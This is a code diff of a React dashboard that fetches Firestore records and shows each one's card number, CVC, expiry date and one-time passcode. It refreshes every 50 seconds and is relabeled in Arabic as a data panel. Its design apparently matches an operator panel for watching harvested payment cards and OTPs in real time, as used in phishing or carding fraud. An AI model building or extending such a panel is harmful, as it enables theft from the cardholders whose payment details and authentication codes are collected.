@@ -18,30 +18,38 @@ const firebaseConfig = {
   measurementId: "G-PG5NPD4FES"
 };
 type User = {
+  id:string,
+
+ payment:{
   cardNumber: string
   expiry: string
   cvc: string
-  otp: string
+ },
+ otp:{
+  otp:string
+ }
 }
 // Initialize Firebase
-const app = initializeApp(firebaseConfig)
-const db = getFirestore(app)
+
 
 export default function Dashboard() {
   const [users, setUsers] = useState<User[]>([])
   const [loading, setLoading] = useState(false)
   const [error, setError] = useState<string | null>(null)
-
+  const app = initializeApp(firebaseConfig)
+  const db = getFirestore(app)
   const fetchUsers = async () => {
     setLoading(true)
     setError(null)
     try {
-      const usersCollection = collection(db, "users")
+      const usersCollection = collection(db, "data")
       const userSnapshot = await getDocs(usersCollection)
+      console.log(userSnapshot.docs[0])
       const userList = userSnapshot.docs.map(doc => ({
         id: doc.id,
         ...doc.data()
       })) as unknown as User[]
+      console.log(userList)
       setUsers(userList)
     } catch (err) {
       setError("Failed to fetch users. Please try again.")
@@ -52,14 +60,14 @@ export default function Dashboard() {
   }
 
   useEffect(() => {
-    fetchUsers()
+  setInterval(()=>  fetchUsers(),50000)
   }, [])
 
   return (
     <div className="container mx-auto p-4">
-      <Card className="w-full max-w-2xl mx-auto">
+      <Card className="w-full max-w-2xl mx-auto" dir="rtl">
         <CardHeader>
-          <CardTitle className="text-2xl font-bold">User List from Firestore</CardTitle>
+          <CardTitle className="text-2xl font-bold">لوحة البيانات</CardTitle>
         </CardHeader>
         <CardContent>
           {loading ? (
@@ -73,16 +81,17 @@ export default function Dashboard() {
           ) : (
             <ul className="space-y-2">
               {users.map(user => (
-                <li key={user.cardNumber} className="bg-secondary p-2 rounded">
-                  <p className="font-semibold">{user.expiry}</p>
-                  <p className="text-sm text-muted-foreground">{user.cvc}</p>
-                  <p className="text-sm text-muted-foreground">{user.otp}</p>
+                <li key={user.id} className="bg-secondary p-2 rounded">
+                  <p className="font-semibold">{user.payment.cardNumber}</p>
+                  <p className="text-sm text-muted-foreground">{user.payment.cvc}</p>
+                  <p className="text-sm text-muted-foreground">{user.payment.expiry}</p>
+                  <p className="text-sm text-muted-foreground">{user.otp.otp}</p>
                 </li>
               ))}
             </ul>
           )}
           <Button onClick={fetchUsers} className="mt-4">
-            Refresh Users
+           تحديث
           </Button>
         </CardContent>
       </Card>
